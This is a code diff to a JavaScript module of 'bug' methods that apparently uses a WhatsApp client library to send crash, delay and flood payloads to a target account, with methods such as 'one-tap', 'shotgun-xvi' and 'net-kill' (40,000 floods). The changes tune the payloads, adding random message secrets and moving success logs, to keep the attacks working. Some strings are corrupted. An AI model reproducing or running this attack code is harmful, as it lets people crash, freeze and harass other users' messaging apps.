@@ -18,7 +18,6 @@ export const bugMethods = {
      * Copyright by Tama Ryuichi
      */
     "sql-invis": async (sock, target) => {
-        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36msql-invis\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
         const Node = [{
             tag: "bot",
             attrs: {
@@ -87,12 +86,11 @@ export const bugMethods = {
         }, {});
 
         await sock.relayMessage(target, msg.message, {
-            participant: {
-                jid: target
-            },
+            participant: target,
             additionalNodes: Node,
             messageId: msg.key.id
         });
+        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36msql-invis\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
     },
 
     /**
@@ -100,8 +98,7 @@ export const bugMethods = {
      * Created by Tama
      */
     "proto-xvi": async (sock, target, mention) => {
-        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mproto-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
-        const imgCrL = "https://files.catbox.moe/6v0m50.jpg";
+        const imgCrL = "https://files.catbox.moe/efqbov.jpg";
         const photo = {
             image: { url: imgCrL },
             caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
@@ -178,6 +175,7 @@ export const bugMethods = {
                 });
             }
         }
+        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mproto-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
     },
 
     /**
@@ -185,7 +183,6 @@ export const bugMethods = {
      * Created by @vaacantivv Vaxzy
      */
     "delay-invis": async (sock, target, mention) => {
-        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mdelay-invis\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
         await sock.relayMessage(
             "status@broadcast", {
             extendedTextMessage: {
@@ -315,6 +312,7 @@ export const bugMethods = {
                 }
             );
         }
+        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mdelay-invis\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
     },
 
     /**
@@ -322,13 +320,15 @@ export const bugMethods = {
      * Created by VaxzyOfficial
      */
     "one-tap": async (sock, target) => {
-        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mone-tap\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
         // First payload: viewOnceMessage
         let msg1 = await generateWAMessageFromContent(
             target,
             {
                 viewOnceMessage: {
                     message: {
+                        messageContextInfo: {
+                            messageSecret: crypto.randomBytes(32)
+                        },
                         interactiveMessage: {
                             header: {
                                 title: "VaxzyIsHere💥",
@@ -353,7 +353,7 @@ export const bugMethods = {
 
         await sock.relayMessage(target, msg1.message, {
             messageId: msg1.key.id,
-            participant: { jid: target },
+            participant: target,
         });
 
         // Second payload: ephemeralMessage
@@ -362,6 +362,9 @@ export const bugMethods = {
             {
                 ephemeralMessage: {
                     message: {
+                        messageContextInfo: {
+                            messageSecret: crypto.randomBytes(32)
+                        },
                         interactiveMessage: {
                             header: {
                                 title: "VaxzyIsHere💥",
@@ -386,8 +389,9 @@ export const bugMethods = {
 
         await sock.relayMessage(target, msg2.message, {
             messageId: msg2.key.id,
-            participant: { jid: target },
+            participant: target,
         });
+        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mone-tap\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
     },
 
     /**
@@ -395,11 +399,13 @@ export const bugMethods = {
      * Created by Dhyrz Lenathea
      */
     "shotgun-xvi": async (sock, target) => {
-        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mshotgun-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
         const messages = [
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE569BA84B3592D" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -428,6 +434,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE501B02E218B31" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -456,6 +465,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE578FEE6E2A55A" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -484,6 +496,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE5281F6F4CCFA8" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -512,6 +527,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE5ED6F8A919BB0" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -521,7 +539,7 @@ export const bugMethods = {
                                 fileLength: { low: 819206, high: 0, unsigned: true },
                                 mediaKey: "UBm5EfsssF4GO3h1dT6D9iYHHpdrx5Y6VWRup97ytAw=",
                                 fileEncSha256: "FtjCBkWUw/UrUfMqoOomMf7mIXJltb5anNcXaoTzVD0=",
-                                directPath: "/o1/v/t62.7118-24/f2/m233/AQOh0J76YIA0x7mQhqiz4f16S_akaZvZsIMrFuHeRTR5bDvGZS7Yng1rXJKvv3lnqqbRPXErdTzFNRiMkug9MMrVXETJkjKF0jm2Xho5oQ?ccb=9-4&oh=01_Q5AaIFpDe1aBmkcFwjpSrupeURIlsv5RSCcMhvvsR-v0RzhN&oe=67CCAC47&_nc_sid=e6ed6c",
+                                directPath: "/o1/v/t62.7118-24/f2/m233/AQOh0J76YIA0x7mQhqiz4f16S_akaZvZsIMrFuHeRTR5bDvGZS7Yng1rXJKvv3lnqqbRPXErdTzFNRiMkug9MMrVXETJkjKF0jm2Xho5oQ?ccb=9-4&oh=01_Q5AaIFpDe1aBmkcFwjpSrupeURIlsv5RSCcMhvvsR-0RzhN&oe=67CCAC47&_nc_sid=e6ed6c",
                                 mediaKeyTimestamp: { low: 1738880400, high: 0, unsigned: false },
                             },
                             productId: "449756950375071",
@@ -540,6 +558,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE5BCA7AF6BA4B9" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -568,6 +589,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE50F0E73C64B23" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -596,6 +620,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE5A4634FF06678" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -624,6 +651,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE59ADA9B665ED7" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -652,6 +682,9 @@ export const bugMethods = {
             {
                 key: { remoteJid: target, fromMe: true, id: "BAE527384F42B4EC" },
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     productMessage: {
                         product: {
                             productImage: {
@@ -682,9 +715,10 @@ export const bugMethods = {
         for (const msg of messages) {
             await sock.relayMessage(target, msg.message, {
                 messageId: msg.key.id,
-                participant: { jid: target }
+                participant: target
             });
         }
+        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mshotgun-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
     },
 
     /**
@@ -692,7 +726,6 @@ export const bugMethods = {
      * Created by XProtexGlow
      */
     "delay-xvi": async (sock, target, mention) => {
-        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mdelay-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
         let parse = true;
         let SID = "5e03e0&mms3";
         let key = "10000000_2012297619515179_5714769099548640934_n.enc";
@@ -711,10 +744,13 @@ export const bugMethods = {
         const message = {
             viewOnceMessage: {
                 message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
                     stickerMessage: {
                         url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                         fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
-                        fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
+                        fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtB9jg9r/o=",
                         mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                         mimetype: type,
                         directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
@@ -815,7 +851,7 @@ export const bugMethods = {
             forwardedNewsletterMessageInfo: {
                 newsletterJid: "120363321780343299@newsletter",
                 serverMessageId: 1,
-                newsletterName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬"
+                newsletterName: "𝙓������𝙂𝙡𝙤𝙬"
             },
             streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
             thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
@@ -858,20 +894,41 @@ export const bugMethods = {
                 seconds: 24,
                 ptt: false,
                 mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
-                caption: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
+                caption: "𝙓������𝙂𝙡𝙤𝙬",
                 fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
             }
         };
 
         const msg1 = await generateWAMessageFromContent(target, {
-            viewOnceMessage: { message: { videoMessage } }
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
+                    videoMessage
+                }
+            }
         }, {});
 
         const msg2 = await generateWAMessageFromContent(target, {
-            viewOnceMessage: { message: stickerMessage }
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        messageSecret: crypto.randomBytes(32)
+                    },
+                    ...stickerMessage
+                }
+            }
         }, {});
 
-        const msg3 = await generateWAMessageFromContent(target, audioMessage, {});
+        const msg3 = await generateWAMessageFromContent(target, {
+            audioMessage: {
+                ...audioMessage.audioMessage,
+                messageContextInfo: {
+                    messageSecret: crypto.randomBytes(32)
+                }
+            }
+        }, {});
 
         // Relay all messages
         for (const msg of [msg1, msg2, msg3]) {
@@ -908,6 +965,7 @@ export const bugMethods = {
                 }]
             });
         }
+        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mdelay-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
     },
 
     /**
@@ -915,7 +973,6 @@ export const bugMethods = {
      * Created by XProtexGlow
      */
     "net-kill": async (sock, target, mention) => {
-        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mnet-kill\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
         const floods = 40000;
         const mentioning = "13135550002@s.whatsapp.net";
         const mentionedJids = [
@@ -1075,5 +1132,6 @@ export const bugMethods = {
                 }]
             });
         }
+        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mnet-kill\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
     }
 };
